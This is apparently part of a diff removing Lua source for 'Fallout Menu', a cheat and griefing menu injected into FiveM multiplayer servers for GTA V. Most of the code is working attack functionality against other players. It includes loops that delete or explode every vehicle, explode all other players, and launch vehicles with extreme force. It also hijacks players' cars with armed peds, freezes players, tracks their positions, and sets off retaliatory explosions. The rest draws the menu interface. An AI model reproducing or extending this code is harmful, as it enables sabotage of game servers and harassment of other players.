-
-    function FM:DeleteLoop()
-        if FM.Config.SafeMode then return FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
-
-        CreateThread(function()
-            while _use_delete_loop do
-                local _veh = FM:GetFunction("IsPedInAnyVehicle") and FM:GetFunction("GetVehiclePedIsIn")(FM:GetFunction("PlayerPedId")())
-
-                for veh in FM:EnumerateVehicles() do
-                    if not _use_delete_loop then break end
-
-                    if veh ~= _veh or FM.Config.OnlineIncludeSelf then
-                        FM.Util:DeleteEntity(veh)
-                    end
-
-                    Wait(1)
-                end
-
-                Wait(5)
-            end
-        end)
-    end
-
-    function FM:ExplodeVehicleLoop()
-        if FM.Config.SafeMode then return FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
-
-        CreateThread(function()
-            while _use_explode_vehicle_loop do
-                local _veh = FM:GetFunction("IsPedInAnyVehicle") and FM:GetFunction("GetVehiclePedIsIn")(FM:GetFunction("PlayerPedId")())
-
-                for veh in FM:EnumerateVehicles() do
-                    if not _use_explode_vehicle_loop then break end
-
-                    if veh ~= _veh or FM.Config.OnlineIncludeSelf then
-                        FM:GetFunction("NetworkExplodeVehicle")(veh, true, false, false)
-                    end
-
-                    Wait(1)
-                end
-
-                Wait(5)
-            end
-        end)
-    end
-
-    function FM:ExplodePlayerLoop()
-        if FM.Config.SafeMode then return FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
-
-        CreateThread(function()
-            while _use_explode_player_loop do
-                for _, src in dict.pairs(FM.PlayerCache) do
-                    if not _use_explode_player_loop then break end
-                    src = dict.tonumber(src)
-
-                    if src ~= PlayerId() or FM.Config.OnlineIncludeSelf then
-                        FM:GetFunction("AddExplosion")(FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("GetPlayerPed")(src), 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)
-                    end
-
-                    Wait(1)
-                end
-
-                Wait(5)
-            end
-        end)
-    end
-
-    function FM:LaunchLoop()
-        if FM.Config.SafeMode then return FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
-
-        CreateThread(function()
-            while _use_launch_loop do
-                local _veh = FM:GetFunction("IsPedInAnyVehicle") and FM:GetFunction("GetVehiclePedIsIn")(FM:GetFunction("PlayerPedId")())
-
-                for veh in FM:EnumerateVehicles() do
-                    if not _use_launch_loop then break end
-
-                    if veh ~= _veh or FM.Config.OnlineIncludeSelf then
-                        if FM:RequestControlSync(veh) then
-                            FM:GetFunction("ApplyForceToEntity")(veh, 3, 0.0, 0.0, 9999999.0, 0.0, 0.0, 0.0, true, true, true, true, false, true)
-                        end
-                    end
-
-                    Wait(1)
-                end
-
-                Wait(5)
-            end
-        end)
-    end
-
-    function FM:SpawnPed(where, heading, model, weapon)
-        if not FM:RequestModelSync(model) then return self:AddNotification("ERROR", "Couldn't load model ~r~" .. model .. " ~w~in time.", 2500) end
-        local ped = FM:GetFunction("CreatePed")(4, FM:GetFunction("GetHashKey")(model), where.x, where.y, where.z, heading or 0.0, true, true)
-        FM:GetFunction("SetNetworkIdCanMigrate")(FM:GetFunction("NetworkGetNetworkIdFromEntity")(ped), true)
-        FM:GetFunction("NetworkSetNetworkIdDynamic")(FM:GetFunction("NetworkGetNetworkIdFromEntity")(ped), false)
-
-        if weapon then
-            FM:GetFunction("GiveWeaponToPed")(ped, FM:GetFunction("GetHashKey")(weapon), 9000, false, true)
-        end
-
-        FM:GetFunction("SetPedAccuracy")(ped, 100)
-
-        return ped
-    end
-
-    function FM:UnlockVehicle(veh)
-        if not FM:GetFunction("DoesEntityExist")(veh) or not FM:GetFunction("IsEntityAVehicle")(veh) then return end
-        if not FM:RequestControlSync(veh) then return FM:AddNotification("ERROR", "Failed to get network control in time. Please try again.", 5000) end
-        FM:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, false)
-        FM:GetFunction("SetVehicleDoorsLockedForPlayer")(veh, PlayerId(), false)
-        FM:GetFunction("SetVehicleDoorsLocked")(veh, false)
-        FM:AddNotification("SUCCESS", "Vehicle unlocked.", 5000)
-    end
-
-    function FM:DisableVehicle(veh)
-        if not FM:GetFunction("DoesEntityExist")(veh) or not FM:GetFunction("IsEntityAVehicle")(veh) then return end
-        if not FM:RequestControlSync(veh) then return FM:AddNotification("ERROR", "Failed to get network control in time. Please try again.", 5000) end
-        SetVehicleUndriveable(veh, true)
-        SetVehicleWheelWidth(veh, 100.0)
-
-        for i = 0, GetVehicleNumberOfWheels(veh) do
-            SetVehicleWheelTireColliderSize(veh, i, 100.0)
-            SetVehicleWheelSize(veh, i, 100.0)
-            SetVehicleWheelTireColliderWidth(veh, i, 100.0)
-        end
-
-        SetVehicleLights(veh, 2)
-        SetVehicleLightsMode(veh, 2)
-        SetVehicleEngineTemperature(veh, dict.math.huge + 0.0)
-        SetVehicleEngineOn(veh, true, true, true)
-        SetVehicleEngineCanDegrade(veh, true)
-        ModifyVehicleTopSpeed(veh, 1.0)
-        FM:AddNotification("SUCCESS", "Vehicle disabled.", 5000)
-    end
-
-    function FM:StealVehicleThread(who, veh, nodrive)
-        if not FM:GetFunction("DoesEntityExist")(veh) or not FM:GetFunction("IsEntityAVehicle")(veh) then return end
-        FM:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(who, true)
-        FM:GetFunction("ClearPedTasks")(who)
-        local driver = FM:GetFunction("GetPedInVehicleSeat")(veh, -1)
-        local timeout = 0
-
-        if FM:GetFunction("DoesEntityExist")(driver) then
-            while FM:GetFunction("DoesEntityExist")(veh) and FM:GetFunction("GetPedInVehicleSeat")(veh, -1) == driver and timeout <= 25000 do
-                FM:GetFunction("TaskCombatPed")(who, driver, 0, 16)
-                timeout = timeout + 100
-                FM:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, false)
-                FM:GetFunction("SetVehicleDoorsLocked")(veh, 7)
-
-                if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["R"]) then
-                    self.Util:DeleteEntity(who)
-                    FM:AddNotification("INFO", "Hijack cancelled.")
-
-                    return false
-                end
-
-                Wait(100)
-            end
-
-            FM:GetFunction("ClearPedTasks")(who)
-            FM:GetFunction("TaskEnterVehicle")(who, veh, 10000, -1, 2.0, 1, 0)
-
-            while FM:GetFunction("DoesEntityExist")(veh) and FM:GetFunction("GetPedInVehicleSeat")(veh, -1) ~= who and timeout <= 25000 do
-                timeout = timeout + 100
-                FM:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, false)
-                FM:GetFunction("SetVehicleDoorsLocked")(veh, 7)
-                FM:GetFunction("NetworkRequestControlOfEntity")(veh)
-
-                if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["R"]) then
-                    self.Util:DeleteEntity(who)
-                    FM:AddNotification("INFO", "Hijack cancelled.")
-
-                    return false
-                end
-
-                Wait(100)
-            end
-        else
-            FM:GetFunction("TaskEnterVehicle")(who, veh, 10000, -1, 2.0, 1, 0)
-
-            while FM:GetFunction("DoesEntityExist")(veh) and FM:GetFunction("GetPedInVehicleSeat")(veh, -1) ~= who and timeout <= 25000 do
-                timeout = timeout + 100
-                FM:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, false)
-                FM:GetFunction("SetVehicleDoorsLocked")(veh, 7)
-                FM:GetFunction("NetworkRequestControlOfEntity")(veh)
-
-                if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["R"]) then
-                    self.Util:DeleteEntity(who)
-                    FM:AddNotification("INFO", "Hijack cancelled.")
-
-                    return false
-                end
-
-                Wait(100)
-            end
-        end
-
-        FM:GetFunction("ClearPedTasks")(who)
-        FM:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(who, false)
-        FM:GetFunction("SetVehicleEngineOn")(veh, true)
-        FM:GetFunction("NetworkRequestControlOfEntity")(veh)
-
-        if not nodrive then
-            for i = 1, 5 do
-                FM:GetFunction("TaskVehicleDriveWander")(who, veh, 120.0, 0)
-            end
-        end
-
-        FM:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, true)
-        FM:GetFunction("SetVehicleDoorsLocked")(veh, 2)
-
-        return true
-    end
-
-    function FM:ScrW()
-        return self._ScrW
-    end
-
-    function FM:ScrH()
-        return self._ScrH
-    end
-
-    local print = _print or print
-
-    function FM:Print(...)
-        local str = (...)
-        if not FM.Config.UsePrintMessages then return false end
-        print("[Fallout Menu] " .. str)
-
-        return true
-    end
-
-    function FM:GetMousePos()
-        return self._MouseX, self._MouseY
-    end
-
-    function FM:RequestControlOnce(entity)
-        if FM:GetFunction("NetworkHasControlOfEntity")(entity) then return true end
-        FM:GetFunction("SetNetworkIdCanMigrate")(FM:GetFunction("NetworkGetNetworkIdFromEntity")(entity), true)
-
-        return FM:GetFunction("NetworkRequestControlOfEntity")(entity)
-    end
-
-    function FM:RequestControlSync(veh, timeout)
-        timeout = timeout or 2000
-        local counter = 0
-        self:RequestControlOnce(veh)
-
-        while not FM:GetFunction("NetworkHasControlOfEntity")(veh) do
-            counter = counter + 100
-            Wait(100)
-            if counter >= timeout then return false end
-        end
-
-        return true
-    end
-
-    function FM:aG(aH, aI, aJ)
-        return coroutine.wrap(function()
-            local aK, t = aH()
-
-            if not t or t == 0 then
-                aJ(aK)
-
-                return
-            end
-
-            local aF = {
-                handle = aK,
-                destructor = aJ
-            }
-
-            setmetatable(aF, aE)
-            local aL = true
-            repeat
-                coroutine.yield(t)
-                aL, t = aI(aK)
-            until not aL
-            aF.destructor, aF.handle = nil, nil
-            aJ(aK)
-        end)
-    end
-
-    function FM:EnumerateVehicles()
-        return FM:aG(FM:GetFunction("FindFirstVehicle"), FM:GetFunction("FindNextVehicle"), FM:GetFunction("EndFindVehicle"))
-    end
-
-    function FM:EnumeratePeds()
-        return FM:aG(FM:GetFunction("FindFirstPed"), FM:GetFunction("FindNextPed"), FM:GetFunction("EndFindPed"))
-    end
-
-    function FM:EnumerateObjects()
-        return FM:aG(FM:GetFunction("FindFirstObject"), FM:GetFunction("FindNextObject"), FM:GetFunction("EndFindObject"))
-    end
-
-    function FM:GetClosestVehicle(max_dist)
-        local veh, dist = nil, dict.math.huge
-        local cur = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
-
-        for vehicle in self:EnumerateVehicles() do
-            local this = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(vehicle, 0.0, 0.0, 0.0)
-
-            if FM:GetFunction("DoesEntityExist")(vehicle) then
-                local distance = FM:GetFunction("GetDistanceBetweenCoords")(cur.x, cur.y, cur.z, this.x, this.y, this.z)
-
-                if distance < dist then
-                    dist = distance
-                    veh = vehicle
-                end
-            end
-        end
-
-        if dist > (max_dist or 10.0) then return end
-
-        return veh, dist
-    end
-
-    function FM:GetClosestPed(max_dist)
-        local ped, dist = nil, dict.math.huge
-        local cur = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
-
-        for pedestrian in self:EnumeratePeds() do
-            local this = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(pedestrian, 0.0, 0.0, 0.0)
-
-            if FM:GetFunction("DoesEntityExist")(pedestrian) then
-                local distance = FM:GetFunction("GetDistanceBetweenCoords")(cur.x, cur.y, cur.z, this.x, this.y, this.z)
-
-                if distance < dist then
-                    dist = distance
-                    ped = pedestrian
-                end
-            end
-        end
-
-        if dist > (max_dist or 10.0) then return end
-
-        return ped, dist
-    end
-
-    function FM:GetClosestObject(max_dist)
-        local obj, dist = nil, dict.math.huge
-        local cur = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
-
-        for object in self:EnumeratePeds() do
-            local this = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(object, 0.0, 0.0, 0.0)
-
-            if FM:GetFunction("DoesEntityExist")(object) then
-                local distance = FM:GetFunction("GetDistanceBetweenCoords")(cur.x, cur.y, cur.z, this.x, this.y, this.z)
-
-                if distance < dist then
-                    dist = distance
-                    obj = object
-                end
-            end
-        end
-
-        if dist > (max_dist or 10.0) then return end
-
-        return obj, dist
-    end
-
-    function FM:DeleteVehicles()
-        local _veh = FM:GetFunction("IsPedInAnyVehicle") and FM:GetFunction("GetVehiclePedIsIn")(FM:GetFunction("PlayerPedId")())
-
-        CreateThread(function()
-            for veh in FM:EnumerateVehicles() do
-                if self:RequestControlSync(veh) and (veh ~= _veh or FM.Config.OnlineIncludeSelf) then
-                    FM.Util:DeleteEntity(veh)
-                end
-            end
-        end)
-    end
-
-    function FM:RepairVehicle(vehicle)
-        if vehicle == 0 then return false end
-        FM:RequestControlOnce(vehicle)
-        FM:GetFunction("SetVehicleFixed")(vehicle)
-
-        return true
-    end
-
-    local was_dragging
-
-    function FM:TranslateMouse(wx, wy, ww, wh, drag_id)
-        local mx, my = self:GetMousePos()
-
-        if not self.DraggingX and not self.DraggingY then
-            self.DraggingX = mx
-            self.DraggingY = my
-        end
-
-        local mpx = self.DraggingX - wx
-        local mpy = self.DraggingY - wy
-
-        if self.DraggingX ~= mx or self.DraggingY ~= my then
-            self.DraggingX = mx
-            self.DraggingY = my
-        end
-
-        local dx = wx - (self.DraggingX - mpx)
-        local dy = wy - (self.DraggingY - mpy)
-
-        was_dragging = drag_id
-
-        return wx - dx, wy - dy
-    end
-
-    local scroller_y
-
-    function FM:TranslateScroller(sy, sh, by)
-        local _, my = self:GetMousePos()
-
-        if not scroller_y then
-            scroller_y = my
-        end
-
-        local mpy = scroller_y - sy
-
-        if scroller_y ~= my then
-            scroller_y = my
-        end
-
-        return mpy
-    end
-
-    local text_cache = {}
-
-    local function _text_width(str, font, scale)
-        font = font or 4
-        scale = scale or 0.35
-        text_cache[font] = text_cache[font] or {}
-        text_cache[font][scale] = text_cache[font][scale] or {}
-        if text_cache[font][scale][str] then return text_cache[font][scale][str].length end
-        FM:GetFunction("BeginTextCommandWidth")("STRING")
-        FM:GetFunction("AddTextComponentSubstringPlayerName")(str)
-        FM:GetFunction("SetTextFont")(font or 4)
-        FM:GetFunction("SetTextScale")(scale or 0.35, scale or 0.35)
-        local length = FM:GetFunction("EndTextCommandGetWidth")(1)
-
-        text_cache[font][scale][str] = {
-            length = length
-        }
-
-        return length
-    end
-
-    function FM.Painter:GetTextWidth(str, font, scale)
-        return _text_width(str, font, scale) * FM:ScrW()
-    end
-
-    function FM.Painter:DrawText(text, font, centered, x, y, scale, r, g, b, a)
-        FM:GetFunction("SetTextFont")(font)
-        FM:GetFunction("SetTextScale")(scale, scale)
-        FM:GetFunction("SetTextCentre")(centered)
-        FM:GetFunction("SetTextColour")(r, g, b, a)
-        FM:GetFunction("BeginTextCommandDisplayText")("STRING")
-        FM:GetFunction("AddTextComponentSubstringPlayerName")(text)
-        FM:GetFunction("EndTextCommandDisplayText")(x / FM:ScrW(), y / FM:ScrH())
-    end
-
-    local listing
-
-    local function _lerp(delta, from, to)
-        if delta > 1 then return to end
-        if delta < 0 then return from end
-
-        return from + (to - from) * delta
-    end
-
-    local color_lists = {}
-
-    function FM.Painter:ListItem(label, px, py, x, y, w, h, r, g, b, a, id)
-        if listing and not FM:GetFunction("IsDisabledControlReleased")(0, 24) then
-            listing = nil
-        end
-
-        if not color_lists[id] then
-            color_lists[id] = {
-                r = 0,
-                g = 0,
-                b = 0
-            }
-        end
-
-        local bool = FM.Config.SelectedCategory == id
-
-        if bool then
-            color_lists[id].r = _lerp(0.1, color_lists[id].r, FM.Tertiary[1])
-            color_lists[id].g = _lerp(0.1, color_lists[id].g, FM.Tertiary[2])
-            color_lists[id].b = _lerp(0.1, color_lists[id].b, FM.Tertiary[3])
-        else
-            color_lists[id].r = _lerp(0.1, color_lists[id].r, 255)
-            color_lists[id].g = _lerp(0.1, color_lists[id].g, 255)
-            color_lists[id].b = _lerp(0.1, color_lists[id].b, 255)
-        end
-
-        self:DrawRect(px + x, py + y, w, h, r, g, b, a)
-        self:DrawText(label, 4, true, px + w / 2, py + y - 5, 0.34, dict.math.ceil(color_lists[id].r), dict.math.ceil(color_lists[id].g), dict.math.ceil(color_lists[id].b), 255)
-
-        if self:Holding(px + x, py + y, w, h, id) or FM.Config.SelectedCategory == id then
-            if not listing and FM.Config.SelectedCategory ~= id then
-                listing = true
-
-                return true
-            else
-                return false
-            end
-        end
-
-        return false
-    end
-
-    local selector
-    local list_choices = {}
-
-    function FM.Painter:DrawSprite(x, y, w, h, heading, dict, name, r, g, b, a, custom)
-        if not FM:GetFunction("HasStreamedTextureDictLoaded")(dict) and not custom then
-            FM:GetFunction("RequestStreamedTextureDict")(dict)
-        end
-
-        FM:GetFunction("DrawSprite")(dict, name, x / FM:ScrW(), y / FM:ScrH(), w / FM:ScrW(), h / FM:ScrH(), heading, r, g, b, a)
-    end
-
-    local left_active, right_active
-
-    function FM.Painter:ListChoice(label, options, px, py, x, y, w, h, r, g, b, a, id, selected, unbind_caller)
-        list_choices[id] = list_choices[id] or {
-            selected = selected or 1,
-            options = options
-        }
-
-        local ret
-        local lR, lG, lB = 255, 255, 255
-        local rR, rG, rB = 255, 255, 255
-        self:DrawText(label, 4, false, px + x, py + y, 0.4, 255, 255, 255, 255)
-        local width = self:GetTextWidth(label, 4, 0.4)
-        local left_x, left_y = px + x + (width - 16.0), py + y + 13
-
-        if self:Holding(left_x + 18 - 9.1, left_y - 5, 38.4, 19.2, 13.5, id .. "_left") then
-            if not left_active or left_active == id .. "_left" then
-                lR, lG, lB = FM.Tertiary[1], FM.Tertiary[2], FM.Tertiary[3]
-            end
-
-            if not left_active then
-                left_active = id .. "_left"
-                local cur = list_choices[id].selected
-                local new = cur - 1
-
-                if not list_choices[id].options[new] then
-                    new = #list_choices[id].options
-                end
-
-                list_choices[id].selected = new
-                ret = true
-            end
-        elseif left_active == id .. "_left" then
-            left_active = nil
-        end
-
-        local cur = list_choices[id].options[list_choices[id].selected]
-
-        if not cur then
-            cur = "NONE"
-        end
-
-        local cur_width = self:GetTextWidth(cur, 4, 0.4)
-
-        if self:Holding(left_x + 18 + cur_width + 16.0 - 9.1, left_y - 5, 19.2, 13.5, id .. "_right") then
-            if not right_active or right_active == id .. "_right" then
-                rR, rG, rB = FM.Tertiary[1], FM.Tertiary[2], FM.Tertiary[3]
-            end
-
-            if not right_active then
-                right_active = id .. "_right"
-                local cur = list_choices[id].selected
-                local new = cur + 1
-
-                if not list_choices[id].options[new] then
-                    new = 1
-                end
-
-                list_choices[id].selected = new
-                ret = true
-            end
-        elseif right_active == id .. "_right" then
-            right_active = nil
-        end
-
-        self:DrawText(cur, 4, false, left_x + 27, left_y - 14, 0.4, 255, 255, 255, 255)
-        self:DrawSprite(left_x + 18, left_y + 2, 38.4, 27.0, 0.0, "commonmenu", "arrowleft", lR, lG, lB, 255)
-        self:DrawSprite(left_x + 18 + cur_width + 16.0, left_y + 2, 38.4, 27.0, 0.0, "commonmenu", "arrowright", rR, rG, rB, 255)
-
-        if self:Hovered(px + x, py + y + 8, width + 27 + cur_width, 10) and unbind_caller and FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["MOUSE2"]) and FM.Config[unbind_caller] ~= "NONE" then
-            FM.Config[unbind_caller] = "NONE"
-            list_choices[id].selected = -1
-            FM.ConfigClass.Save(true)
-            ret = false
-        end
-
-
-        return ret
-    end
-
-    local checked
-    local color_checks = {}
-
-    function FM.Painter:CheckBox(label, bool, px, py, x, y, w, h, r, g, b, a, id, centered, size)
-        if not FM:GetFunction("IsDisabledControlPressed")(0, 24) and checked then
-            checked = nil
-        end
-
-        if not color_checks[id] then
-            color_checks[id] = {
-                r = 0,
-                g = 0,
-                b = 0,
-                a = 0
-            }
-        end
-
-        self:DrawRect(px + x, py + y, 20, 20, 25, 25, 25, 200)
-
-        if bool then
-            color_checks[id].r = _lerp(0.1, color_checks[id].r, FM.Tertiary[1])
-            color_checks[id].g = _lerp(0.1, color_checks[id].g, FM.Tertiary[2])
-            color_checks[id].b = _lerp(0.1, color_checks[id].b, FM.Tertiary[3])
-            color_checks[id].a = _lerp(0.1, color_checks[id].a, 200)
-        else
-            color_checks[id].r = _lerp(0.1, color_checks[id].r, 20)
-            color_checks[id].g = _lerp(0.1, color_checks[id].g, 20)
-            color_checks[id].b = _lerp(0.1, color_checks[id].b, 20)
-            color_checks[id].a = _lerp(0.1, color_checks[id].a, 0)
-        end
-
-        self:DrawRect(px + x + 2.5, py + y + 2.5, 15, 15, dict.math.ceil(color_checks[id].r), dict.math.ceil(color_checks[id].g), dict.math.ceil(color_checks[id].b), dict.math.ceil(color_checks[id].a))
-        self:DrawText(label, 4, centered, centered and (px + w / 2) or (px + x + 25), py + y - 4, size or 0.37, r, g, b, a)
-
-        if self:Holding(px + x, py + y, w, h, id) then
-            if not checked then
-                checked = id
-
-                if FM.Config.UseSounds then
-                    FM:GetFunction("PlaySoundFrontend")(-1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", false)
-                end
-
-                return true
-            else
-                return false
-            end
-        end
-
-        return false
-    end
-
-    local activated
-
-    function FM.Painter:Button(label, px, py, x, y, w, h, r, g, b, a, id, centered, size)
-        if not FM:GetFunction("IsDisabledControlPressed")(0, 24) and activated then
-            activated = nil
-        end
-
-        if not w then
-            w = self:GetTextWidth(label, 4, size or 0.37)
-        end
-
-        if self:Holding(px + x, py + y, w, h, id) then
-            self:DrawText(label, 4, centered, centered and (px + w / 2) or (px + x), py + y, size or 0.37, FM.Tertiary[1], FM.Tertiary[2], FM.Tertiary[3], FM.Tertiary[4])
-
-            if not activated then
-                activated = id
-
-                if FM.Config.UseSounds then
-                    FM:GetFunction("PlaySoundFrontend")(-1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", false)
-                end
-
-                return true
-            else
-                return false
-            end
-        end
-
-        self:DrawText(label, 4, centered, centered and (px + w / 2) or (px + x), py + y, size or 0.37, r, g, b, a)
-
-        return false
-    end
-
-    function FM.Painter:DrawRect(x, y, w, h, r, g, b, a)
-        local _w, _h = w / FM:ScrW(), h / FM:ScrH()
-        local _x, _y = x / FM:ScrW() + _w / 2, y / FM:ScrH() + _h / 2
-        FM:GetFunction("DrawRect")(_x, _y, _w, _h, r, g, b, a)
-    end
-
-    function FM.Painter:Hovered(x, y, w, h)
-        local mx, my = FM:GetMousePos()
-
-        if mx >= x and mx <= x + w and my >= y and my <= y + h then
-            return true
-        else
-            return false
-        end
-    end
-
-    local holding
-
-    function FM.Painter:Holding(x, y, w, h, id)
-        if FM:GetFunction("UpdateOnscreenKeyboard")() ~= -1 and FM:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and FM:GetFunction("UpdateOnscreenKeyboard")() ~= 2 then return end
-        if holding == id and FM:GetFunction("IsDisabledControlPressed")(0, 24) then return true end
-        if holding ~= nil and FM:GetFunction("IsDisabledControlPressed")(0, 24) then return end
-
-        if self:Hovered(x, y, w, h) and FM:GetFunction("IsDisabledControlPressed")(0, 24) then
-            holding = id
-
-            return true
-        elseif holding == id and not self:Hovered(x, y, w, h) or not FM:GetFunction("IsDisabledControlPressed")(0, 24) then
-            holding = nil
-        end
-
-        return false
-    end
-
-    local clicked
-
-    function FM.Painter:Clicked(x, y, w, h)
-        if clicked then
-            if not FM:GetFunction("IsDisabledControlPressed")(0, 24) then
-                clicked = false
-            end
-
-            return false
-        end
-
-        if self:Hovered(x, y, w, h) and FM:GetFunction("IsDisabledControlJustReleased")(0, 24) then
-            clicked = true
-
-            return true
-        end
-
-        return false
-    end
-
-    function FM:Clamp(what, min, max)
-        if what < min then
-            return min
-        elseif what > max then
-            return max
-        else
-            return what
-        end
-    end
-
-    function FM:LimitRenderBounds()
-        local cx, cy = self.Config.MenuX, self.Config.MenuY
-        cx = self:Clamp(cx, 5, FM:ScrW() - self.MenuW - 5)
-        cy = self:Clamp(cy, 42, FM:ScrH() - self.MenuH - 5)
-        local nx, ny = self.Config.NotifX, self.Config.NotifY
-
-        if nx and ny and self.Config.NotifW then
-            nx = self:Clamp(nx, 30, FM:ScrW() - self.Config.NotifW - 30)
-            ny = self:Clamp(ny, 30, FM:ScrH() - notifications_h - 30)
-
-            self.Config.NotifX = nx
-            self.Config.NotifY = ny
-        end
-
-        self.Config.MenuX = cx
-        self.Config.MenuY = cy
-    end
-
-    function FM:AddCategory(title, func)
-        self.Categories[#self.Categories + 1] = {
-            Title = title,
-            Build = func
-        }
-    end
-
-    function FM:SetPedModel(model)
-        if not self:RequestModelSync(model) then return self:AddNotification("ERROR", "Couldn't load model ~r~" .. model .. " ~w~in time.") end
-        FM:GetFunction("SetPlayerModel")(FM:GetFunction("PlayerId")(), model)
-    end
-
-    function FM:GetPedVehicleSeat(ped)
-        local vehicle = FM:GetFunction("GetVehiclePedIsIn")(ped, false)
-        local invehicle = FM:GetFunction("IsPedInAnyVehicle")(ped, false)
-
-        if invehicle then
-            for i = -2, FM:GetFunction("GetVehicleMaxNumberOfPassengers")(vehicle) do
-                if (FM:GetFunction("GetPedInVehicleSeat")(vehicle, i) == ped) then return i end
-            end
-        end
-
-        return -2
-    end
-
-    function FM:GetModelLength(ent)
-        local min, max = FM:GetFunction("GetModelDimensions")(FM:GetFunction("GetEntityModel")(ent))
-
-        return max.y - min.y
-    end
-
-    function FM:GetModelHeight(ent)
-        local min, max = FM:GetFunction("GetModelDimensions")(FM:GetFunction("GetEntityModel")(ent))
-
-        return max.z - min.z
-    end
-
-    function FM:Tracker()
-        if not self.TrackingPlayer then return end
-
-        if not FM:GetFunction("DoesEntityExist")(FM:GetFunction("GetPlayerPed")(self.TrackingPlayer)) then
-            self.TrackingPlayer = nil
-
-            return
-        end
-
-        local coords = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("GetPlayerPed")(self.TrackingPlayer, 0.0, 0.0, 0.0))
-        FM:GetFunction("SetNewWaypoint")(coords.x, coords.y)
-    end
-
-    function FM:DoFrozen()
-        for src, bool in dict.pairs(frozen_players) do
-            src = dict.tonumber(src)
-            local ped = FM:GetFunction("GetPlayerPed")(src)
-
-            if FM:GetFunction("DoesEntityExist")(ped) and bool then
-                FM:GetFunction("ClearPedTasks")(ped)
-                FM:GetFunction("ClearPedTasksImmediately")(ped)
-                FM:GetFunction("DisablePlayerFiring")(src, true)
-            end
-        end
-    end
-
-    local blips = {}
-
-    function FM:DoBlips(remove)
-        if remove or not FM.Config.Player.Blips or not FM.Enabled then
-            if remove or #blips > 0 then
-                for src, blip in dict.pairs(blips) do
-                    FM:GetFunction("RemoveBlip")(blip)
-                    blips[src] = nil
-                end
-            end
-
-            return
-        end
-
-        for src, blip in dict.pairs(blips) do
-            if not FM:GetFunction("DoesEntityExist")(FM:GetFunction("GetPlayerPed")(src)) then
-                FM:GetFunction("RemoveBlip")(blip)
-                blips[src] = nil
-            else
-                local coords = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("GetPlayerPed")(src, 0.0, 0.0, 0.0))
-                local head = FM:GetFunction("GetEntityHeading")(FM:GetFunction("GetPlayerPed")(src))
-                FM:GetFunction("SetBlipCoords")(blip, coords.x, coords.y, coords.z)
-                FM:GetFunction("SetBlipRotation")(blip, dict.math.ceil(head))
-                FM:GetFunction("SetBlipCategory")(blip, 7)
-                FM:GetFunction("SetBlipScale")(blip, 0.87)
-            end
-        end
-
-        for id, src in dict.pairs(FM.PlayerCache) do
-            src = dict.tonumber(src)
-
-            if FM:GetFunction("DoesEntityExist")(FM:GetFunction("GetPlayerPed")(src)) and not blips[src] and src ~= PlayerId() then
-                local coords = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("GetPlayerPed")(src, 0.0, 0.0, 0.0))
-                local head = FM:GetFunction("GetEntityHeading")(FM:GetFunction("GetPlayerPed")(src))
-                local blip = FM:GetFunction("AddBlipForCoord")(coords.x, coords.y, coords.z)
-                FM:GetFunction("SetBlipSprite")(blip, 1)
-                FM:GetFunction("ShowHeadingIndicatorOnBlip")(blip, true)
-                FM:GetFunction("SetBlipRotation")(blip, dict.math.ceil(head))
-                FM:GetFunction("SetBlipScale")(blip, 0.87)
-                FM:GetFunction("SetBlipCategory")(blip, 7)
-                FM:GetFunction("BeginTextCommandSetBlipName")("STRING")
-                FM:GetFunction("AddTextComponentSubstringPlayerName")(FM:GetFunction("GetPlayerName")(src))
-                FM:GetFunction("EndTextCommandSetBlipName")(blip)
-                blips[src] = blip
-            end
-        end
-    end
-
-    function FM:DoAntiAim()
-        if not self.Config.Player.AntiAim then return end
-
-        for id, src in dict.pairs(FM.PlayerCache) do
-            src = dict.tonumber(src)
-            local ped = FM:GetFunction("GetPlayerPed")(src)
-            local ret, ent = FM:GetFunction("GetEntityPlayerIsFreeAimingAt")(src)
-
-            if ret and ent == FM:GetFunction("PlayerPedId")() then
-                local pos = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
-                FM:GetFunction("AddExplosion")(pos.x, pos.y, pos.z, 18, 1.0, false, true, 10.0)
-            end
-        end
-    end
-
-    function FM:TeleportToWaypoint()
-        local waypoint = FM:GetFunction("GetFirstBlipInfoId")(8)
-        if not DoesBlipExist(waypoint) then return FM:AddNotification("ERROR", "No waypoint!", 5000) end
-        local coords = FM:GetFunction("GetBlipInfoIdCoord")(waypoint)
-
-        CreateThread(function()
-            for height = 100, -100, -5 do
-                FM:GetFunction("SetPedCoordsKeepVehicle")(FM:GetFunction("PlayerPedId")(), coords.x, coords.y, height + 0.0)
-                local foundGround, zPos = FM:GetFunction("GetGroundZFor_3dCoord")(coords.x, coords.y, height + 0.0)
-
-                if foundGround then
